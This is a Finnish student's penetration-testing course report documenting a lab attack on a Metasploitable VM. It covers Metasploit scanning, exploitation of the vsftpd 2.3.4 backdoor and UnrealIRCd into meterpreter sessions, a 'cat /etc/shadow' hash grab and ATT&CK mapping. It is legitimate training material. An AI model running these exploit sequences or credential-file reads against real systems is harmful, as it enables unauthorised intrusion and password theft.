## h3 EternalHomework
Raporttitehtävät Tero Karvisen kurssille - Tunkeutumistestaus ICI005AS3A-3007.

Syksy 2026.
#### Ympäristö

VBox Kali GNU/Linux

Ryzen 5

---
#### x) Lue/katso/kuuntele ja tiivistä. (Tässä x-alakohdassa ei tarvitse tehdä testejä tietokoneella, vain lukeminen tai kuunteleminen ja tiivistelmä riittää. Tiivistämiseen riittää muutama ranskalainen viiva.)
**€ Jaswal 2020: Mastering Metasploit - 4ed: Chapter 1: Approaching a Penetration Test Using Metasploit (kohdasta Conducting a penetration test with Metasploit luvun loppuun eli "Summary" loppuun)**
- Metasploit on tehokas tunkeutumistestaus-työkalu
- Tunkeutumistestauksen vaiheita ja Metasploitin perusteita

**Mitä 'nmap -sn' tekee? Älä arvaa, vaan perustele lähteillä. Mistä tiedät, että käyttämäsi lähde on luotettava?**

-sn: Ping Scan - disable port scan, otettu suoraan `nmap -help` komennosta.


---
#### b) Tallenna porttiskannauksen tuloksia Metasploitin tietokantoihin. Skannaa niin, että Metasploitable tulee mukaan. Kannattaa ottaa mukaan ainakin versioskannaus -sV (joka on banner grabbing plus).
Alustettiin tietokanta ja avattiin msfconsole.

  
    sudo msfdb init
    sudo msfconsole

<img width="597" height="491" alt="image" src="https://github.com/user-attachments/assets/079c3261-9f80-4c8f-8d0d-82ffdc5f4531" />


Porttiskannattiin localhost ja saatiin 0 palvelutulosta.

    db_nmap -sV localhost  #'Failed to resolve "localhost"
    
Tehtiin uusi porttiskannaus Metasploitablen IP:llä ja palvelut tulostui raporttiin.

    db_nmap -T4 -sV 192.168.56.102

<img width="727" height="517" alt="image" src="https://github.com/user-attachments/assets/ddf64985-3be5-4e18-8347-b673691b5ea0" />

---
#### c) Tarkastele Metasploitin tietokantoihin tallennettuja tietoja komennoilla "hosts" ja "services". Kokeile suodattaa näitä listoja tai hakea niistä.
Syötettiin komennot ja kokeiltiin suodattaa listat.

    hosts
    hosts -S linux

<img width="760" height="292" alt="image" src="https://github.com/user-attachments/assets/4e5355a2-1361-428a-8b9c-29d73683bdf5" />

    services
    services -p 21

<img width="776" height="537" alt="image" src="https://github.com/user-attachments/assets/66c53032-ba1b-4acf-8e0b-e10e7ca3601d" />

<br>

<img width="592" height="120" alt="image" src="https://github.com/user-attachments/assets/c74e5775-c39a-430f-9974-3b799fe2c87f" />

---
#### d) Internet famous. Etsi Metasploitablen mukana tulevista hyökkäyksistä (en: exploits; search) sellainen, joka on ollut julkisuudessa.
vsftpd 2.3.4 sisältää backdoorin, mikä avaa portin 6200/tcp.

https://www.cve.org/CVERecord?id=CVE-2011-2523

---
#### e) Vertaile nmap:n omaa tiedostoon tallennusta (-oA foo) ja db_nmap:n tallennusta tietokantoihin. Mitkä ovat eri tiedostomuotojen ja Metasploitin tietokannan hyvät puolet?
-oA tallentaa tiedostot 3 formaattiin.
 - foo.nmap
 - foo.xml
 - foo.gnmap

db_nmap tallentaa tiedot suoraan Metasploitin tietokantaan.
 - helpompi käsitellä skannatut tiedot

---
#### f) Murtaudu Metasploitablen vsftpd-palveluun
Etsittiin ja valittiin moduuli. Katsottiin myös moduulin vaihtoehtoja.

    search vsftpd
    use 1
    show options

<img width="792" height="307" alt="image" src="https://github.com/user-attachments/assets/5fe8da21-e0e5-41f1-a2c4-19bf233e5e45" />
<br>
<img width="772" height="132" alt="image" src="https://github.com/user-attachments/assets/7b6372b6-4698-4255-b60d-0578ba71c0a6" />
<br>
<img width="222" height="97" alt="image" src="https://github.com/user-attachments/assets/1dd8c9aa-8d61-49c3-bf21-a76c37382e0f" />
<br>
Lisättiin hyökkäyskohde.

    set RHOSTS 192.168.56.102

<img width="561" height="35" alt="image" src="https://github.com/user-attachments/assets/43c265ee-3d56-4fa3-8e76-de6e3996940c" />
<br>

Ajettiin `exploit` ja tuli virhe.

<img width="775" height="35" alt="image" src="https://github.com/user-attachments/assets/e8a5bc4a-d7ba-41ba-8ebd-ef76701431ef" />

Asetettiin LHOST.

    set LHOST 192.168.56.101

<img width="785" height="97" alt="image" src="https://github.com/user-attachments/assets/79da5405-1423-40ae-b9c0-87def14de1f8" />

Exploit epäonnistui. Ajettiin uudestaan ja se siirtyi meterpreter consoleen ja hyökkäys onnistui.

<img width="790" height="185" alt="image" src="https://github.com/user-attachments/assets/3540f977-6eab-41f2-a34e-248844390a69" />


---
#### g) Kerää levittäytymisessä (lateral movement) tarvittavaa tietoa metasploitablesta. Analysoi tiedot. Selitä, miten niitä voisi hyödyntää.
Kerättiin shadow-kansiosta tietoa, missä sisältää käyttäjien hash-arvot.

    cat /etc/shadow

<img width="517" height="592" alt="image" src="https://github.com/user-attachments/assets/2cd740fc-24f8-490d-abf5-bdd4a1836e72" />

Arp-taulukon tiedot. Tiedoilla voi tehdä arp-myrkytys.

    arp

<img width="405" height="150" alt="image" src="https://github.com/user-attachments/assets/018984ae-5195-4c2c-94ac-1772afd59744" />



---
#### h) Murtaudu Metasploitableen jollain toisella tavalla. (Jos tämä kohta on vaikea, voit tarvittaessa turvautua verkosta löytyviin läpikävelyohjeisiin. Merkitse silloin raporttiin, missä määrin tarvitsit niitä).
Joistakin vaihtoehdoista löytyi tosi paljon moduuleja. Otettiin [Metasploitable 2 Exploitability Guidesta](https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/) mallia ja valittiin UnrealIRCD. 

Sitä olikin moduuleja vain 1. Jatkettiin ilman mallia.

Tunkeutumista jatkettiin aikaisemman vsftpd-tunkeutumisen tyyliin.

    search unrealircd
    use 0
    show options
    setg RHOSTS 192.168.56.102
    setg LHOST 192.168.56.101
    exploit

<img width="617" height="65" alt="image" src="https://github.com/user-attachments/assets/f1e9fc71-7c58-4900-bd3c-b517de4dc269" />

Exploit kuitenkin epäonnistui. Se kertoo, että portti 8080 on jo käytössä tai ei käytettävissä.

<img width="1116" height="52" alt="image" src="https://github.com/user-attachments/assets/644f97b9-831e-4d0a-a7f6-ee1cf5a50f78" />

Pyrittiin korjata tilanne Chat-GPT:n avulla.

    set FETCH_SRVPORT 8081

Ajettiin `exploit` uudestaan ja tunkeutuminen onnistui.

<img width="872" height="207" alt="image" src="https://github.com/user-attachments/assets/2324437e-a256-45c8-a1cb-669c5fd6e38e" />

---
#### i) Demonstroi Meterpretrin ominaisuuksia.
Tässä hieman ominaisuuksia. Kommentit otettu suoraan meterpreter `help`-komennosta.

    getuid     #Get the user that the server is running as
    sysinfo    #Gets information about the remote system, such as OS
    arp        #Display the host ARP cache
    ps         #List running processes

<img width="420" height="132" alt="image" src="https://github.com/user-attachments/assets/3c83dbbe-085f-42e0-934e-44ad43d8abc8" />
<br>
<img width="395" height="127" alt="image" src="https://github.com/user-attachments/assets/9bbe4e87-b7a5-459e-bdab-7c26f086ce5c" />

---
#### j) Tallenna shell-sessio tekstitiedostoon script-työkalulla (script -fa log001.txt) tai tmux:lla.
Syötetty `script -fa log001.txt` toiseen terminaaliin.

---
#### k) Pivot point. Laita kaikki harjoituksen tiedostot (script -fa, nmap -oA...) samaan kansioon. Hae sopiva pivot point (sovellus, versio, osoite, MAC-numero) 'grep -r' -komennolla. Keksi uskottava esimerkkikysymys, johon haet vastausta.
Kaikki tiedostot siirretty `Pivot_point`-kansioon. Tehtiin alustavasti yksinkertainen `grep -r "unrealirc"` ja kokeiltaessa muita arvoja kuten ip ja versio, `grep -r` sekosi ja heitti loputtoman määrän toistokomentoa `grep -r`.

<img width="1255" height="947" alt="image" src="https://github.com/user-attachments/assets/2098b822-b92f-41dd-bf6a-7cbca139e5bb" />

Tehtiin `log001.txt` tiedosto uudestaan.

Ajettiin `grep -r "realirc"` ja `grep -r vsftpd`.

<img width="1257" height="92" alt="Näyttökuva 2026-09-08 210648" src="https://github.com/user-attachments/assets/0dbe6699-5281-4ad3-9053-ff8bc286e9ef" />
<br>
<img width="1255" height="402" alt="image" src="https://github.com/user-attachments/assets/6d4ef34d-129f-4ef6-a1e6-5709ca783ee1" />

---
#### l) Attaaack! Mitä Mitre Attack taktiikoita ja tekniikoita käytit tässä harjoituksessa? (Tässä alakohdassa "Attaack!" ei tarvitse tehdä lisää testejä koneella, koska testit on jo tehty.)
**Recon**
- Active Scanning 
- Gather Victim Host Information
  
**Initial Access**
- Exploit Public-Facing Application 
- External Remote Services
  
**Execution**
- Command and Scripting Interpreter
  
**Credential Access**
- OS Credential Dumping
  
**Discovery**
-  	Account Discovery 

---
#### Lähteet
[ATT&CK Matrix for Enterprise](https://attack.mitre.org/).

[ChatGPT](https://chatgpt.com/) hyödynnetty h) tehtävässä.

[CVE-2011-2523](https://www.cve.org/CVERecord?id=CVE-2011-2523).

Jaswal, N. 2020: [Mastering Metasploit - Fourth Edition. Chapter 1: Approaching a Penetration Test Using Metasploit](https://learning.oreilly.com/library/view/mastering-metasploit/9781838980078/). Packt Publishing. E-kirja.
